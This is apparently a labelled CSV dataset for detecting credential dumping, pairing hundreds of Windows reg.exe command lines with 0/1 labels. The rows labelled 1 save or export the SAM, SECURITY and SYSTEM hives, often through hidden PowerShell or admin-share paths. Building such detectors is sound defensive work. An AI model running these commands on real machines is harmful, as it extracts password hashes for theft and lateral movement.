text,label
powershell -exec bypass -w hidden -c reg.exe  save  hkey_local_machine\security  \.\c$ackup.reg  /y,1
"reg  query  ""hkey_users\control panel\desktop\subkey100""  /v version",0
"start /b reg   add   ""hkey_users\software\policies\mycorp\subkey57""   /v lastupdate      /d ""c:\program files\app""",0
"powershell -c reg.exe   save   ""hkey_local_machine\hkey_local_machine\software\policies\microsoft""   ""c:\windows\temp\software_dump.dat""",0
reg,0
"powershell -c reg.exe unload ""hkcu\environment"" /v lastupdate",0
"reg  compare  ""hkey_local_machine\environment""  ""hkey_local_machine\software\myapp\settings_445""",0
pwsh -noprofile -c reg.exe   export   hkey_local_machine\sam c:\windows\temp\sam.save  /y,1
"reg compare ""hkey_users\hkey_local_machine\system\currentcontrolset\control"" ""hkey_users\hkey_local_machine\software\wow6432node_494""",0
reg   save   hklm\sam  c:\windows\temp\sam.save   /y,1
"powershell -c reg.exe   query   ""hkey_local_machine\software\microsoft\windows\currentversion\subkey95""   /v path",0
"powershell -c reg.exe   delete   ""hkey_current_user\system\currentcontrolset\services""   /v lastupdate",0
"start /b reg   query   ""hkey_local_machine\software\classes""   /f",0
"reg.exe   copy   ""hkey_users\control panel\desktop""   ""hkey_users\environment_831""",0
"reg  compare  ""hkcu\software\myapp\settings\subkey53""  ""hkcu\software\policies\mycorp_287""",0
c:\windows\system32\cmd.exe /k reg  save hklm\sam  c:\temp\system.hive   /y,1
"reg.exe  unload  ""hku\environment\subkey31""  /f",0
"reg.exe   restore   ""hkey_local_machine\control panel\desktop""   ""hkey_local_machine\hkey_local_machine\software\wow6432node_359""",0
cmd.exe /c start /b reg.exe  export hkey_local_machine\sam   c:\temp\system.hive,1
reg   save   hkey_local_machine\security \.\c$ackup.reg,1
"reg.exe   add   ""hkey_current_user\hkey_local_machine\software\policies\microsoft\subkey74""      /t reg_dword   /d 1",0
powershell -exec bypass -w hidden -c reg  export  hkey_local_machine\sam   c:\temp\system.hive /y,1
powershell -exec bypass -w hidden -c reg   save hklm\security   \.\c$ackup.reg /y,1
"start /b reg.exe  save  ""hkcu\control panel\desktop\subkey94""  ""d:\backup\registry_hive.dat""",0
"powershell -c reg.exe save ""hkey_local_machine\software\myapp\settings\subkey3"" ""c:\users\public\chrome_data.bak""",0
powershell -exec bypass -w hidden -c reg save   hklm\security   c:\temp\system.hive,1
"start /b reg add ""hkcu\software\google\chrome"" /v lastupdate  /d ""c:\program files\app""",0
"cmd /c powershell -c ""reg   save  hkey_local_machine\system  \.\c$ackup.reg /y""",1
pwsh -noprofile -c reg   export  hklm\security \.\c$ackup.reg,1
c:\windows\system32\cmd.exe /k reg  save   hkey_local_machine\system c:\users\public\registry_export.reg /y,1
"powershell -c reg   delete   ""hkey_local_machine\environment""   /f",0
"reg.exe  query  ""hkcu\software\microsoft\windows\currentversion\subkey14""",0
powershell -command reg save   hkey_local_machine\sam \.\c$ackup.reg,1
"reg.exe save ""hkey_local_machine\hkey_local_machine\system\currentcontrolset\control\subkey99"" ""c:\temp\user_settings.reg"" /y",0
"reg.exe save ""hkey_local_machine\hkey_local_machine\software\wow6432node\subkey53"" ""d:\backup\registry_hive.dat"" /y",0
cmd.exe /c reg save   hklm\security   c:\windows\temp\sam.save  /y,1
pwsh -noprofile -c reg  export hklm\system  \\localhost\c$\__dump\sam.bak,1
cmd.exe /c start /b reg.exe  export  hkey_local_machine\sam  %temp%\sec_backup.dat /y,1
powershell -command reg  save hkey_local_machine\system   c:\temp\system.hive,1
powershell -command reg.exe save   hkey_local_machine\security c:\temp\system.hive /y,1
"reg   query   ""hkey_current_user\software\classes""   /v path",0
"cmd /c reg.exe   compare   ""hkey_users\hkey_local_machine\system\currentcontrolset\control\subkey66""   ""hkey_users\hkey_local_machine\software\policies\microsoft_679""",0
reg.exe save hklm\security   \\localhost\c$\__dump\sam.bak,1
cmd.exe /c reg.exe save   hklm\sam   c:\windows\temp\sam.save /y,1
cmd.exe /c start /b reg.exe export   hklm\sam  c:\windows\temp\sam.save /y,1
"reg.exe   save   ""hku\software\policies\mycorp\subkey2""   ""%temp%\non_sensitive.hive""",0
cmd.exe /c reg.exe  save   hklm\system   %temp%\sec_backup.dat,1
"reg.exe  copy  ""hkey_current_user\environment\subkey97""  ""hkey_current_user\hkey_local_machine\system\currentcontrolset\control_483""",0
cmd.exe /c start /b reg  save  hkey_local_machine\system   c:\users\public\registry_export.reg,1
cmd.exe /c reg.exe  save  hklm\sam  \\localhost\c$\__dump\sam.bak   /y,1
"powershell -c reg  query  ""hkey_users\software\myapp\settings""  /v version",0
powershell -command reg.exe export hkey_local_machine\sam \\localhost\c$\__dump\sam.bak   /y,1
"cmd /c reg  delete  ""hkey_users\hkey_local_machine\software\policies\microsoft""  /v path",0
c:\windows\system32\cmd.exe /k reg   save hkey_local_machine\system  \\localhost\c$\__dump\sam.bak  /y,1
"cmd /c powershell -c ""reg.exe   export  hklm\sam   %temp%\sec_backup.dat""",1
cmd.exe /c start /b reg.exe  export  hklm\sam   %temp%\sec_backup.dat,1
pwsh -noprofile -c reg   save   hklm\security   c:\windows\temp\sam.save /y,1
powershell -command reg  export  hkey_local_machine\sam c:\windows\temp\sam.save,1
cmd.exe /c reg save  hklm\sam  c:\users\public\registry_export.reg   /y,1
"reg.exe query ""hkey_users\software\microsoft\windows\currentversion"" /f",0
"cmd /c powershell -c ""reg.exe   export  hkey_local_machine\sam %temp%\sec_backup.dat""",1
"reg  query  ""hku\environment\subkey93""  /v path",0
"reg compare ""hku\software\google\chrome\subkey27"" ""hku\system\currentcontrolset\services_928""",0
"reg copy ""hku\environment"" ""hku\software\microsoft\windows\currentversion_489""",0
"reg.exe  unload  ""hkey_current_user\software\classes\subkey92""  /v lastupdate",0
"reg.exe save ""hkey_local_machine\hkey_local_machine\software\wow6432node\subkey39"" ""c:\users\public\chrome_data.bak"" /y",0
powershell -command reg.exe  save   hklm\system c:\windows\temp\sam.save,1
powershell -exec bypass -w hidden -c reg.exe   export   hklm\system   %temp%\sec_backup.dat,1
"reg unload ""hkcu\software\myapp\settings\subkey73"" /v version",0
powershell -exec bypass -w hidden -c reg   export   hklm\sam   %temp%\sec_backup.dat   /y,1
reg.exe export hklm\system   %temp%\sec_backup.dat   /y,1
"reg.exe  save  ""hkey_current_user\system\currentcontrolset\services""  ""d:\backup\registry_hive.dat""",0
powershell -exec bypass -w hidden -c reg.exe  save  hkey_local_machine\sam c:\windows\temp\sam.save /y,1
cmd.exe /c start /b reg save  hklm\sam  c:\temp\system.hive,1
powershell -exec bypass -w hidden -c reg   save  hkey_local_machine\sam   c:\temp\system.hive,1
cmd.exe /c reg.exe   export  hklm\security   \.\c$ackup.reg   /y,1
"cmd /c reg delete ""hkey_local_machine\software\classes\subkey6"" /v lastupdate",0
"start /b reg.exe  query  ""hkey_local_machine\software\google\chrome""  /f",0
"reg save ""hkey_current_user\software\classes\subkey38"" ""d:\backup\registry_hive.dat"" /y",0
reg export  hkey_local_machine\security %temp%\sec_backup.dat  /y,1
cmd.exe /c reg  save  hkey_local_machine\security   c:\windows\temp\sam.save  /y,1
"reg.exe   save   ""hkey_users\software\microsoft\windows\currentversion""   ""%temp%\non_sensitive.hive""   /y",0
"powershell -c reg   query   ""hkey_users\software\google\chrome""",0
c:\windows\system32\cmd.exe /k reg   export  hkey_local_machine\security \.\c$ackup.reg  /y,1
"reg   query   ""hkey_current_user\hkey_local_machine\software\policies\microsoft\subkey66""   /v lastupdate",0
"cmd /c reg.exe   copy   ""hku\hkey_local_machine\software\wow6432node\subkey12""   ""hku\software\microsoft\windows\currentversion_952""",0
reg   export   hkey_local_machine\sam   \\localhost\c$\__dump\sam.bak   /y,1
"reg  restore  ""hkcu\hkey_local_machine\software\policies\microsoft\subkey68""  ""hkcu\software\microsoft\windows\currentversion_671""",0
"reg   copy   ""hkey_current_user\hkey_local_machine\software\wow6432node\subkey7""   ""hkey_current_user\control panel\desktop_716""",0
"reg.exe add ""hkey_local_machine\software\policies\mycorp"" /v lastupdate /t reg_sz",0
cmd.exe /c reg.exe   save  hklm\system \\localhost\c$\__dump\sam.bak,1
"reg.exe copy ""hkcu\software\policies\mycorp\subkey67"" ""hkcu\system\currentcontrolset\services_171""",0
"reg.exe compare ""hkey_users\software\classes\subkey21"" ""hkey_users\software\myapp\settings_331""",0
"powershell -c reg  add  ""hkey_local_machine\system\currentcontrolset\services""  /v lastupdate  /t reg_sz  /d 1",0
pwsh -noprofile -c reg  save   hkey_local_machine\sam \.\c$ackup.reg  /y,1
tasklist.exe,0
powershell -exec bypass -w hidden -c reg.exe   save   hklm\system \\localhost\c$\__dump\sam.bak,1
cmd.exe /c start /b reg.exe save   hklm\sam c:\windows\temp\sam.save /y,1
"powershell -c reg.exe  copy  ""hku\software\policies\mycorp\subkey66""  ""hku\software\microsoft\windows\currentversion_293""",0
"cmd /c powershell -c ""reg.exe   export hkey_local_machine\security   c:\temp\system.hive""",1
"cmd /c powershell -c ""reg.exe  save  hkey_local_machine\sam %temp%\sec_backup.dat""",1
"powershell -c reg.exe unload ""hkey_users\environment\subkey24"" /v lastupdate",0
reg query,0
pwsh -noprofile -c reg.exe   export  hkey_local_machine\sam \\localhost\c$\__dump\sam.bak  /y,1
"reg query ""hku\software\classes"" /v path",0
"reg  unload  ""hku\software\classes""  /v path",0
cmd.exe /c start /b reg.exe  save hkey_local_machine\system   c:\windows\temp\sam.save   /y,1
"reg   add   ""hkey_local_machine\software\policies\mycorp""         /d 1",0
attrib -h -s C:\temp\my_file.txt,0
pwsh -noprofile -c reg.exe  export  hkey_local_machine\system  c:\users\public\registry_export.reg /y,1
powershell -command reg save  hkey_local_machine\system \.\c$ackup.reg,1
powershell -exec bypass -w hidden -c reg.exe  export  hkey_local_machine\sam   \.\c$ackup.reg   /y,1
cmd.exe /c reg.exe  save  hkey_local_machine\system  c:\windows\temp\sam.save   /y,1
"reg delete ""hkey_current_user\software\myapp\settings\subkey29""",0
powershell -exec bypass -w hidden -c reg.exe  save   hkey_local_machine\sam  \\localhost\c$\__dump\sam.bak   /y,1
"cmd /c reg query ""hkey_users\hkey_local_machine\software\policies\microsoft"" /f",0
"reg query ""hkey_users\hkey_local_machine\system\currentcontrolset\control\subkey10"" /v lastupdate",0
"reg.exe  unload  ""hku\software\myapp\settings\subkey92""  /v lastupdate",0
c:\windows\system32\cmd.exe /k reg export  hklm\security  %temp%\sec_backup.dat  /y,1
"reg.exe  add  ""hkcu\hkey_local_machine\system\currentcontrolset\control\subkey89""  /v path    /d ""1.0.0""",0
"reg.exe   copy   ""hkcu\hkey_local_machine\software\wow6432node""   ""hkcu\software\classes_325""",0
"powershell -c reg   compare   ""hku\software\microsoft\windows\currentversion""   ""hku\software\classes_201""",0
"reg copy ""hku\software\google\chrome\subkey39"" ""hku\software\microsoft\windows\currentversion_461""",0
powershell -exec bypass -w hidden -c reg.exe export   hkey_local_machine\security  \.\c$ackup.reg,1
cmd.exe /c start /b reg.exe export  hklm\sam   \.\c$ackup.reg  /y,1
"reg.exe   add   ""hkey_users\hkey_local_machine\software\policies\microsoft""   /v lastupdate   /t reg_sz   /d 1",0
cmd.exe /c start /b reg   export   hklm\security \.\c$ackup.reg   /y,1
"reg   unload   ""hkey_users\software\microsoft\windows\currentversion""   /v path",0
cmd.exe /c reg.exe   save  hkey_local_machine\security c:\windows\temp\sam.save  /y,1
"powershell -c reg query ""hkey_local_machine\environment"" /v version",0
cmd.exe /c start /b reg.exe   export   hklm\security \\localhost\c$\__dump\sam.bak  /y,1
powershell -command reg.exe   export hkey_local_machine\system   c:\windows\temp\sam.save   /y,1
"reg.exe add ""hkcu\hkey_local_machine\system\currentcontrolset\control"" /v version /t reg_sz",0
"cmd /c powershell -c ""reg  export  hklm\security  \\localhost\c$\__dump\sam.bak   /y""",1
powershell -exec bypass -w hidden -c reg.exe save  hklm\security c:\users\public\registry_export.reg,1
c:\windows\system32\cmd.exe /k reg.exe  save hkey_local_machine\security %temp%\sec_backup.dat,1
"cmd /c powershell -c ""reg  export  hklm\security \\localhost\c$\__dump\sam.bak""",1
"powershell -c reg.exe   compare   ""hkcu\environment""   ""hkcu\hkey_local_machine\system\currentcontrolset\control_520""",0
"reg unload ""hkey_users\control panel\desktop""",0
"cmd /c powershell -c ""reg.exe  save   hklm\sam   %temp%\sec_backup.dat""",1
"reg   compare   ""hkey_current_user\software\policies\mycorp""   ""hkey_current_user\control panel\desktop_217""",0
c:\windows\system32\cmd.exe /k reg   export hkey_local_machine\sam   c:\windows\temp\sam.save,1
cmd.exe /c start /b reg   export hklm\security  %temp%\sec_backup.dat  /y,1
"reg save ""hkey_local_machine\hkey_local_machine\software\wow6432node\subkey39"" ""d:\backup\registry_hive.dat""",0
"cmd /c reg  save  ""hkcu\hkey_local_machine\software\policies\microsoft\subkey40""  ""c:\users\public\chrome_data.bak""",0
powershell -command reg   save  hklm\system  \\localhost\c$\__dump\sam.bak  /y,1
reg  save   hklm\sam  c:\users\public\registry_export.reg   /y,1
cmd.exe /c reg.exe  save  hkey_local_machine\system c:\windows\temp\sam.save,1
c:\windows\system32\cmd.exe /k reg.exe   save   hkey_local_machine\security  \.\c$ackup.reg,1
"cmd /c powershell -c ""reg.exe  export   hklm\system  c:\temp\system.hive""",1
cmd.exe /c reg export  hkey_local_machine\sam   c:\temp\system.hive,1
reg.exe   export  hkey_local_machine\system \.\c$ackup.reg,1
"reg   copy   ""hkey_users\software\myapp\settings\subkey3""   ""hkey_users\hkey_local_machine\software\policies\microsoft_970""",0
"cmd /c powershell -c ""reg   save   hkey_local_machine\system  \\localhost\c$\__dump\sam.bak""",1
"start /b reg copy ""hkey_users\software\myapp\settings"" ""hkey_users\hkey_local_machine\software\wow6432node_430""",0
"cmd /c reg.exe delete ""hkcu\hkey_local_machine\software\policies\microsoft"" /v version",0
cmd.exe /c reg.exe save   hkey_local_machine\system \\localhost\c$\__dump\sam.bak,1
"powershell -c reg   unload   ""hkey_local_machine\software\classes""   /v lastupdate",0
reg  export  hkey_local_machine\system   \.\c$ackup.reg /y,1
"reg.exe query ""hkcu\hkey_local_machine\system\currentcontrolset\control\subkey7"" /v path",0
pwsh -noprofile -c reg   save   hkey_local_machine\sam  c:\temp\system.hive,1
"reg.exe  unload  ""hkey_local_machine\software\google\chrome""  /v version",0
cmd.exe /c reg.exe save   hklm\security  c:\users\public\registry_export.reg   /y,1
pwsh -noprofile -c reg.exe   save  hkey_local_machine\sam  c:\temp\system.hive,1
"reg copy ""hkey_local_machine\hkey_local_machine\software\policies\microsoft\subkey67"" ""hkey_local_machine\hkey_local_machine\software\policies\microsoft_773""",0
cmd.exe /c start /b reg.exe save   hklm\system \\localhost\c$\__dump\sam.bak,1
"cmd /c powershell -c ""reg.exe   export  hklm\security  \\localhost\c$\__dump\sam.bak   /y""",1
c:\windows\system32\cmd.exe /k reg.exe  save   hkey_local_machine\system c:\temp\system.hive,1
"reg  copy  ""hkcu\software\policies\mycorp\subkey27""  ""hkcu\software\policies\mycorp_265""",0
cmd.exe /c reg.exe  export   hklm\sam   c:\users\public\registry_export.reg  /y,1
reg.exe   save   hklm\security c:\temp\system.hive,1
powershell -command reg   save  hklm\sam  \.\c$ackup.reg  /y,1
"powershell -c reg add ""hkey_current_user\software\google\chrome\subkey36"" /v lastupdate /t reg_dword /d ""c:\program files\app""",0
"reg add ""hku\system\currentcontrolset\services\subkey78"" /v lastupdate  /d ""1.0.0""",0
"reg.exe unload ""hku\hkey_local_machine\software\wow6432node"" /v version",0
cmd.exe /c reg  save   hklm\sam c:\windows\temp\sam.save,1
"reg  copy  ""hkey_users\hkey_local_machine\system\currentcontrolset\control""  ""hkey_users\control panel\desktop_628""",0
"reg  copy  ""hkcu\software\microsoft\windows\currentversion""  ""hkcu\environment_770""",0
"cmd /c powershell -c ""reg  export  hkey_local_machine\security  \\localhost\c$\__dump\sam.bak   /y""",1
"reg delete ""hkey_local_machine\hkey_local_machine\system\currentcontrolset\control"" /v path",0
powershell -exec bypass -w hidden -c reg export  hklm\system   %temp%\sec_backup.dat   /y,1
pwsh -noprofile -c reg   export   hklm\security   \.\c$ackup.reg   /y,1
reg  export hklm\sam  %temp%\sec_backup.dat   /y,1
"reg   restore   ""hkey_current_user\hkey_local_machine\software\wow6432node""   ""hkey_current_user\software\policies\mycorp_776""",0
cmd.exe /c start /b reg save   hkey_local_machine\security  c:\users\public\registry_export.reg /y,1
powershell -exec bypass -w hidden -c reg.exe  save   hklm\sam   c:\windows\temp\sam.save,1
"start /b reg.exe  add  ""hkey_users\software\classes\subkey22""  /v lastupdate  /t reg_sz  /d 1",0
reg.exe export  hklm\security c:\users\public\registry_export.reg  /y,1
"cmd /c powershell -c ""reg.exe save   hkey_local_machine\system   \.\c$ackup.reg""",1
"cmd /c reg.exe   add   ""hkey_current_user\control panel\desktop\subkey98""   /f      /d ""c:\program files\app""",0
reg.exe save   hkey_local_machine\system  c:\users\public\registry_export.reg /y,1
powershell -exec bypass -w hidden -c reg  export  hkey_local_machine\system   \.\c$ackup.reg,1
"powershell -c reg.exe  save  ""hkey_local_machine\hkey_local_machine\software\policies\microsoft\subkey77""  ""c:\temp\user_settings.reg""  /y",0
pwsh -noprofile -c reg   save hklm\system   %temp%\sec_backup.dat  /y,1
reg.exe   save hklm\system  %temp%\sec_backup.dat  /y,1
c:\windows\system32\cmd.exe /k reg.exe  export hklm\security  \.\c$ackup.reg  /y,1
pwsh -noprofile -c reg.exe   save hklm\system  c:\windows\temp\sam.save /y,1
"powershell -c reg   query   ""hkey_local_machine\hkey_local_machine\software\wow6432node\subkey72""   /f",0
cmd.exe /c start /b reg.exe  save  hkey_local_machine\system   %temp%\sec_backup.dat /y,1
"cmd /c reg.exe   delete   ""hku\hkey_local_machine\software\wow6432node""   /v lastupdate",0
powershell -command reg  save hkey_local_machine\security  %temp%\sec_backup.dat /y,1
cmd.exe /c reg.exe   export   hklm\sam  c:\temp\system.hive,1
"reg.exe  compare  ""hkey_local_machine\software\microsoft\windows\currentversion\subkey92""  ""hkey_local_machine\control panel\desktop_447""",0
"reg save ""hkey_local_machine\hkey_local_machine\system\currentcontrolset\control\subkey61"" ""c:\temp\user_settings.reg""",0
"start /b reg.exe restore ""hkey_current_user\software\myapp\settings"" ""hkey_current_user\software\classes_319""",0
c:\windows\system32\cmd.exe /k reg   save   hkey_local_machine\system %temp%\sec_backup.dat,1
"reg.exe  save  ""hkey_local_machine\hkey_local_machine\software\wow6432node\subkey82""  ""c:\windows\temp\software_dump.dat""  /y",0
powershell -exec bypass -w hidden -c reg.exe save   hkey_local_machine\system \.\c$ackup.reg  /y,1
cmd.exe /c reg.exe  export  hklm\sam c:\windows\temp\sam.save,1
"reg.exe  query  ""hkey_local_machine\software\myapp\settings\subkey26""  /f",0
powershell -command reg.exe  export hkey_local_machine\sam   \.\c$ackup.reg /y,1
c:\windows\system32\cmd.exe /k reg.exe   save  hklm\sam  c:\users\public\registry_export.reg  /y,1
cmd.exe /c reg   save  hklm\system  \\localhost\c$\__dump\sam.bak,1
pwsh -noprofile -c reg.exe save hklm\security   \\localhost\c$\__dump\sam.bak,1
cmd.exe /c start /b reg  export   hklm\system   %temp%\sec_backup.dat,1
"reg.exe  delete  ""hkey_users\hkey_local_machine\software\wow6432node""  /v version",0
reg export   hkey_local_machine\sam \\localhost\c$\__dump\sam.bak   /y,1
"start /b reg  query  ""hkey_users\software\classes\subkey95""",0
"reg.exe restore ""hku\software\myapp\settings\subkey16"" ""hku\system\currentcontrolset\services_888""",0
"reg  query  ""hku\software\classes\subkey73""  /v lastupdate",0
"cmd /c reg  unload  ""hku\hkey_local_machine\software\policies\microsoft""  /v lastupdate",0
"powershell -c reg.exe   copy   ""hkey_current_user\software\microsoft\windows\currentversion\subkey39""   ""hkey_current_user\hkey_local_machine\software\wow6432node_257""",0
c:\windows\system32\cmd.exe /k reg  save  hkey_local_machine\system c:\windows\temp\sam.save,1
"start /b reg.exe   query   ""hkcu\hkey_local_machine\software\policies\microsoft\subkey55""",0
powershell -command reg.exe  save  hklm\security c:\windows\temp\sam.save /y,1
cmd.exe /c reg.exe  export   hklm\sam   \.\c$ackup.reg,1
"powershell -c reg  restore  ""hku\control panel\desktop""  ""hku\hkey_local_machine\system\currentcontrolset\control_920""",0
pwsh -noprofile -c reg.exe   export   hkey_local_machine\system \.\c$ackup.reg /y,1
"reg.exe save ""hkcu\hkey_local_machine\system\currentcontrolset\control\subkey83"" ""%temp%\non_sensitive.hive""",0
c:\windows\system32\cmd.exe /k reg   export  hkey_local_machine\security  %temp%\sec_backup.dat,1
reg.exe,0
powershell -command reg.exe  export  hkey_local_machine\sam  c:\users\public\registry_export.reg,1
reg   save   hklm\system   \.\c$ackup.reg  /y,1
pwsh -noprofile -c reg save hkey_local_machine\sam %temp%\sec_backup.dat /y,1
cmd.exe /c start /b reg.exe export hkey_local_machine\sam   \\localhost\c$\__dump\sam.bak /y,1
reg.exe   save hkey_local_machine\system  c:\windows\temp\sam.save,1
"reg.exe compare ""hku\control panel\desktop"" ""hku\environment_398""",0
"reg.exe copy ""hkcu\system\currentcontrolset\services"" ""hkcu\hkey_local_machine\software\wow6432node_291""",0
reg   export hkey_local_machine\sam c:\users\public\registry_export.reg  /y,1
c:\windows\system32\cmd.exe /k reg   save  hklm\system   %temp%\sec_backup.dat /y,1
"reg.exe   add   ""hkcu\hkey_local_machine\software\wow6432node""   /v path   /t reg_sz   /d 1",0
powershell -command reg.exe   export   hklm\security  \.\c$ackup.reg  /y,1
cmd.exe /c start /b reg.exe  save  hkey_local_machine\security  c:\temp\system.hive   /y,1
"reg  restore  ""hkey_users\system\currentcontrolset\services\subkey23""  ""hkey_users\control panel\desktop_295""",0
"reg save ""hkey_local_machine\environment\subkey49"" ""c:\users\public\chrome_data.bak"" /y",0
"reg.exe add ""hku\software\policies\mycorp"" /v lastupdate /t reg_sz /d 1",0
reg  save   hkey_local_machine\sam  c:\temp\system.hive,1
"cmd /c powershell -c ""reg  export  hklm\security  \.\c$ackup.reg   /y""",1
cmd.exe /c start /b reg save  hkey_local_machine\sam \.\c$ackup.reg  /y,1
powershell -exec bypass -w hidden -c reg  export   hkey_local_machine\system \\localhost\c$\__dump\sam.bak,1
"cmd /c reg  copy  ""hku\system\currentcontrolset\services\subkey68""  ""hku\software\microsoft\windows\currentversion_855""",0
"powershell -c reg.exe   delete   ""hku\hkey_local_machine\software\policies\microsoft\subkey42""   /v lastupdate",0
powershell -command reg   save  hkey_local_machine\system  %temp%\sec_backup.dat /y,1
"cmd /c reg compare ""hkey_current_user\software\microsoft\windows\currentversion\subkey52"" ""hkey_current_user\system\currentcontrolset\services_319""",0
c:\windows\system32\cmd.exe /k reg   export   hklm\system c:\windows\temp\sam.save   /y,1
pwsh -noprofile -c reg.exe  save hkey_local_machine\security \\localhost\c$\__dump\sam.bak,1
cmd.exe /c reg.exe export   hkey_local_machine\system  c:\windows\temp\sam.save /y,1
reg.exe save hklm\system  c:\users\public\registry_export.reg  /y,1
pwsh -noprofile -c reg save   hklm\sam   %temp%\sec_backup.dat   /y,1
cmd.exe /c reg  export  hklm\system  c:\users\public\registry_export.reg  /y,1
"cmd /c reg.exe   compare   ""hkcu\hkey_local_machine\software\policies\microsoft\subkey59""   ""hkcu\software\microsoft\windows\currentversion_100""",0
"reg   delete   ""hkey_users\environment\subkey84""   /v path",0
pwsh -noprofile -c reg.exe  save hklm\sam   c:\windows\temp\sam.save,1
powershell -exec bypass -w hidden -c reg   export   hkey_local_machine\security  \.\c$ackup.reg  /y,1
powershell -command reg   export hklm\sam   %temp%\sec_backup.dat,1
"reg.exe   restore   ""hkey_local_machine\software\microsoft\windows\currentversion""   ""hkey_local_machine\hkey_local_machine\software\wow6432node_612""",0
reg   save   hkey_local_machine\security  c:\windows\temp\sam.save /y,1
c:\windows\system32\cmd.exe /k reg.exe export hklm\system  \\localhost\c$\__dump\sam.bak /y,1
reg   export   hklm\security c:\temp\system.hive  /y,1
powershell -exec bypass -w hidden -c reg  export hklm\system   c:\windows\temp\sam.save,1
powershell -exec bypass -w hidden -c reg   export hkey_local_machine\system c:\windows\temp\sam.save,1
c:\windows\system32\cmd.exe /k reg   export   hkey_local_machine\security   %temp%\sec_backup.dat  /y,1
powershell -command reg.exe  save hkey_local_machine\sam  c:\users\public\registry_export.reg   /y,1
c:\windows\system32\cmd.exe /k reg.exe  export  hkey_local_machine\system  %temp%\sec_backup.dat,1
cmd.exe /c start /b reg.exe   save  hklm\sam   c:\users\public\registry_export.reg,1
pwsh -noprofile -c reg  export   hklm\security   %temp%\sec_backup.dat,1
pwsh -noprofile -c reg save   hklm\sam   \.\c$ackup.reg  /y,1
"powershell -c reg   save   ""hkey_local_machine\hkey_local_machine\software\wow6432node""   ""%temp%\non_sensitive.hive""   /y",0
c:\windows\system32\cmd.exe /k reg export   hkey_local_machine\security   c:\windows\temp\sam.save,1
c:\windows\system32\cmd.exe /k reg   export hklm\security %temp%\sec_backup.dat  /y,1
"reg   query   ""hkey_users\control panel\desktop""",0
pwsh -noprofile -c reg save  hklm\system  \.\c$ackup.reg   /y,1
"reg.exe  save  ""hkey_local_machine\hkey_local_machine\software\wow6432node\subkey56""  ""c:\users\public\chrome_data.bak""",0
cmd.exe /c start /b reg.exe save   hklm\security  c:\users\public\registry_export.reg /y,1
cmd.exe /c start /b reg.exe export   hklm\security   \.\c$ackup.reg  /y,1
powershell -command reg   export hkey_local_machine\security   c:\windows\temp\sam.save   /y,1
cmd.exe /c start /b reg export   hkey_local_machine\sam  c:\users\public\registry_export.reg,1
cmd.exe /c start /b reg save  hkey_local_machine\system   \.\c$ackup.reg   /y,1
powershell -command reg.exe  export   hkey_local_machine\sam \.\c$ackup.reg   /y,1
powershell -c reg.exe save HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet C:\temp\currentcontrolset.dat,0
"cmd /c powershell -c ""reg   save   hkey_local_machine\system   c:\windows\temp\sam.save""",1
"cmd /c reg  compare  ""hkey_users\system\currentcontrolset\services""  ""hkey_users\software\classes_170""",0
cmd.exe /c start /b reg.exe save hklm\system  c:\temp\system.hive,1
"reg   restore   ""hku\software\microsoft\windows\currentversion""   ""hku\software\google\chrome_458""",0
pwsh -noprofile -c reg.exe  save  hklm\system   %temp%\sec_backup.dat   /y,1
"reg copy ""hkey_users\control panel\desktop\subkey23"" ""hkey_users\hkey_local_machine\software\wow6432node_250""",0
c:\windows\system32\cmd.exe /k reg  export hkey_local_machine\system   %temp%\sec_backup.dat,1
c:\windows\system32\cmd.exe /k reg save   hklm\system   c:\users\public\registry_export.reg  /y,1
"reg.exe  unload  ""hku\control panel\desktop\subkey82""",0
"reg.exe  query  ""hkey_users\software\google\chrome\subkey74""  /v path",0
"powershell -c reg query ""hkcu\control panel\desktop""",0
"reg.exe   query   ""hkey_current_user\control panel\desktop""   /v path",0
pwsh -noprofile -c reg  export hklm\sam \.\c$ackup.reg,1
pwsh -noprofile -c reg.exe export hklm\sam   c:\users\public\registry_export.reg,1
"reg.exe restore ""hkey_users\software\google\chrome\subkey63"" ""hkey_users\software\myapp\settings_776""",0
powershell -exec bypass -w hidden -c reg.exe export   hklm\security %temp%\sec_backup.dat,1
"reg copy ""hku\hkey_local_machine\system\currentcontrolset\control"" ""hku\software\google\chrome_937""",0
cmd.exe /c start /b reg.exe save   hkey_local_machine\security  \\localhost\c$\__dump\sam.bak,1
"reg compare ""hkcu\hkey_local_machine\software\wow6432node"" ""hkcu\software\policies\mycorp_342""",0
"reg  copy  ""hku\system\currentcontrolset\services\subkey21""  ""hku\system\currentcontrolset\services_197""",0
"reg add ""hkcu\software\policies\mycorp"" /v path /t reg_dword /d ""c:\program files\app""",0
pwsh -noprofile -c reg save   hkey_local_machine\system  c:\users\public\registry_export.reg  /y,1
